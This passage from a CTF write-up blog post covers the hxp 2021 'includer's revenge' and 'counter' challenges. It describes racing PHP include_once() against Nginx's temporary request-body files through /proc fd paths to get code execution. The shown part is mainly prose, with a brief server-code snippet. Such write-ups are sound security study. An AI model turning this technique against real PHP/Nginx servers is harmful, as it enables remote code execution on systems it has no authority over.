+</code></pre></div></div>
+
+<p>Our exploit tries to get PHP to <code class="language-plaintext highlighter-rouge">include_once()</code> Nginx’s request body temporary file before it’s deleted. In order to do that, we need to constantly create many HTTP requests with our payload as a (large) request body, as fast as possible.</p>
+
+<p>We use a <code class="language-plaintext highlighter-rouge">requests.Session</code> object with a large pool configured in order to speed up our HTTP requests and reduce the TCP handshake overhead.</p>
+
+<p>Afterwards, we loop over the processes to see which ones are Nginx workers, since we’ll need their PIDs to build the FD path leading to the request body files.</p>
+
+<p>After creating the session and retrieving the Nginx worker PIDs (if cache wasn’t used) - we run the main exploit logic in parallel by leveraging Python’s <code class="language-plaintext highlighter-rouge">multiprocessing</code> (threads might won’t be enough in this case due to GIL):</p>
+
+<ul>
+  <li>We create a subprocess per CPU (in <code class="language-plaintext highlighter-rouge">send_payload_multiprocess()</code>) and use that to constantly (<code class="language-plaintext highlighter-rouge">while True</code>) send HTTP requests with a large request body containing our PHP payload (<code class="language-plaintext highlighter-rouge">system("/runflag")</code> for these challenges). We used (nearly) 1MB payloads but anything between 16KB - 1MB should work (Nginx rejects request bodies larger than 1MB by default). The number of CPUs is crucial here since we need to create files fast enough to win the race.</li>
+  <li>We create a subprocess per Nginx worker with a thread for every FD (between 10 - 45). Each thread triggers the PHP <code class="language-plaintext highlighter-rouge">include_once()</code> for <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code>, while adding a randomly-generated prefix of chained paths as described above.</li>
+</ul>
+
+<h2 id="winning-the-race">Winning the Race</h2>
+
+<p>The code in the implementation above worked pretty quickly on <code class="language-plaintext highlighter-rouge">includer's revenge</code> both locally and on the remote server. But when running against <code class="language-plaintext highlighter-rouge">counter</code> - we couldn’t get it to work remotely. The following code is taken from <code class="language-plaintext highlighter-rouge">counter</code>‘s server:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">include_once</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In addition to the Nginx creation and deletion race we now have another race - we need <code class="language-plaintext highlighter-rouge">file_put_contents()</code> to write to the path before the content is in it, and <code class="language-plaintext highlighter-rouge">include_once()</code> to be executed after Nginx writes the request body into it. This made us think - what happens when <code class="language-plaintext highlighter-rouge">file_put_contents()</code> is called on the Nginx FD path after it’s deleted? When we looked into the request body directory (<code class="language-plaintext highlighter-rouge">/var/lib/nginx/body/</code>) it was full with files formatted as <code class="language-plaintext highlighter-rouge">0000001337 (deleted)</code> (the number is Nginx’s auto-incremented file format). These files filled 80% of our local Docker’s storage, but when querying the remote server (reading <code class="language-plaintext highlighter-rouge">/sys/block/sda/sda1/size</code> via PHP) we found they have much more storage than us and we should be OK 🙂</p>
+
+<p>Even though the exploit worked locally for <code class="language-plaintext highlighter-rouge">counter</code> (while filling the storage) - we couldn’t get it to work remotely, since winning the race is much less probable. Sniffing the traffic showed that there’s too much latency and packet loss at the rates we’re sending. Geo-locating the remote server showed that it’s in Germany while the exploit was running from US.</p>
+
+<p>We decided to purchase a VPS in Azure in the Germany region. Running the script there improved the Nginx PID retrieval significantly (30 seconds to 5 seconds) but the exploit still didn’t show results. Eventually, we noticed the new VPS only had 4 cores. We spent a few more $ to buy a 16-core VM in Germany, and got the flag within 5 seconds!</p>
+
+<p>The conclusion - always use money to solve your problems!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html';
+     this.page.identifier = '/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021';
+     this.page.title = 'Winning the Impossible Race &#8211; An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//lewin.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html">
+            THCon 2k22 CTF - "Local Card Maker" Writeup
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/03/02/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi.html">
+            Bathroom Smart Speaker Part 2 &#8211; AirPlay to Bluetooth Speaker via Raspberry Pi
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/09/16/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant.html">
+            Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/airplay/" class="set-1">airplay</a> <a href="/tag/api/" class="set-1">api</a> <a href="/tag/apple-music/" class="set-1">apple music</a> <a href="/tag/as3992/" class="set-1">as3992</a> <a href="/tag/bank/" class="set-1">bank</a> <a href="/tag/bidirectional/" class="set-1">bidirectional</a> <a href="/tag/bluetooth/" class="set-5">bluetooth</a> <a href="/tag/blueutil/" class="set-1">blueutil</a> <a href="/tag/bose/" class="set-1">bose</a> <a href="/tag/configuration-profile/" class="set-1">configuration profile</a> <a href="/tag/controlplane/" class="set-1">controlplane</a> <a href="/tag/crash/" class="set-1">crash</a> <a href="/tag/credit-card/" class="set-1">credit card</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/debug/" class="set-1">debug</a> <a href="/tag/dhcp/" class="set-1">dhcp</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/exploit/" class="set-5">exploit</a> <a href="/tag/facebook/" class="set-1">facebook</a> <a href="/tag/finance/" class="set-1">finance</a> <a href="/tag/grpc/" class="set-1">grpc</a> <a href="/tag/grpc-java/" class="set-1">grpc-java</a> <a href="/tag/home-assistant/" class="set-5">home assistant</a> <a href="/tag/hotspot/" class="set-1">hotspot</a> <a href="/tag/hxp/" class="set-1">hxp</a> <a href="/tag/inactivity/" class="set-1">inactivity</a> <a href="/tag/iodine/" class="set-1">iodine</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/ip/" class="set-1">ip</a> <a href="/tag/iphone/" class="set-1">iphone</a> <a href="/tag/jq/" class="set-1">jq</a> <a href="/tag/kernel/" class="set-1">kernel</a> <a href="/tag/lfi/" class="set-5">lfi</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/lldb/" class="set-1">lldb</a> <a href="/tag/lock/" class="set-1">lock</a> <a href="/tag/mac/" class="set-1">mac</a> <a href="/tag/macbook/" class="set-1">macbook</a> <a href="/tag/manual-screensaver-cron/" class="set-1">manual-screensaver-cron</a> <a href="/tag/messenger/" class="set-1">messenger</a> <a href="/tag/nginx/" class="set-1">nginx</a> <a href="/tag/notifications/" class="set-1">notifications</a> <a href="/tag/oncompleted/" class="set-1">oncompleted</a> <a href="/tag/onerror/" class="set-1">onerror</a> <a href="/tag/pasten/" class="set-1">pasten</a> <a href="/tag/php/" class="set-5">php</a> <a href="/tag/pi-btaudio/" class="set-1">pi-btaudio</a> <a href="/tag/power-manager/" class="set-1">power manager</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/quietcomfort/" class="set-1">quietcomfort</a> <a href="/tag/radxa-rock-pro/" class="set-1">radxa rock pro</a> <a href="/tag/raspberry-pi/" class="set-5">raspberry pi</a> <a href="/tag/raspotify/" class="set-1">raspotify</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/reddit/" class="set-1">reddit</a> <a href="/tag/rfid/" class="set-1">rfid</a> <a href="/tag/rock-pro/" class="set-1">rock pro</a> <a href="/tag/rtl8187l/" class="set-1">rtl8187l</a> <a href="/tag/screensaver/" class="set-1">screensaver</a> <a href="/tag/sha-1/" class="set-1">sha-1</a> <a href="/tag/shairport-sync/" class="set-1">shairport-sync</a> <a href="/tag/spotcast/" class="set-1">spotcast</a> <a href="/tag/spotify/" class="set-5">spotify</a> <a href="/tag/ssh/" class="set-1">ssh</a> <a href="/tag/static/" class="set-1">static</a> <a href="/tag/statusruntimeexception/" class="set-1">statusruntimeexception</a> <a href="/tag/stream/" class="set-1">stream</a> <a href="/tag/streamobserver/" class="set-1">streamobserver</a> <a href="/tag/telegram/" class="set-1">telegram</a> <a href="/tag/ubiquiti/" class="set-1">ubiquiti</a> <a href="/tag/ue-boom/" class="set-5">ue boom</a> <a href="/tag/unable-to-attach/" class="set-1">unable to attach</a> <a href="/tag/unifi/" class="set-1">unifi</a> <a href="/tag/unintended/" class="set-1">unintended</a> <a href="/tag/web/" class="set-1">web</a> <a href="/tag/webcore/" class="set-1">webcore</a> <a href="/tag/webkit/" class="set-1">webkit</a> <a href="/tag/wifi/" class="set-1">wifi</a> <a href="/tag/xcode/" class="set-1">xcode</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
